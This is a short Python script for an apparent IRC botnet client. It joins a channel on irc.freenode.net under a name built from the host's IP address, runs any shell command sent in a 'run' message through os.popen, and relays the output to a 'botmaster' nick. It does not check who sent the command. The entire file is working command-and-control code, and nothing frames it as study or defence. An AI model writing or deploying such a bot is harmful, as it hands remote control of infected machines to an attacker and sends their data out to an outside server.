#!/usr/bin/python

import socket
import os, sys, time

network = 'irc.freenode.net'
port = 6667
chan = '#channel'
ipaddr = socket.gethostbyname(socket.gethostname())
nick =  'bot' + ipaddr.replace('.', '-')
owner = 'botmaster'

irc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
irc.connect((network, port))
irc.send('NICK ' + nick + '\r\n')
irc.send('USER %s %s %s :%s\r\n' % (nick, nick, network, nick))
irc.send('JOIN :' + chan + '\r\n')

def send(msg):
	irc.send(msg)

time.sleep(5)
send('PRIVMSG ' + chan + ' :' + nick + ' has joined.\r\n')
while 1:
	data = irc.recv(4096)
	#print data
	try:
		command = data.split(':')[2]
		if command.find('run') <> -1:
			run_com = command.split('`')[1].rstrip('\r\n')
			pipe = os.popen(run_com)
			output = pipe.readlines()
			for line in output:
				send('PRIVMSG ' + owner + ' :' + line + '\r\n')
	except:
		pass
	if data.find('PING') != -1:
		send('PONG ' + data.split()[1] + '\r\n')
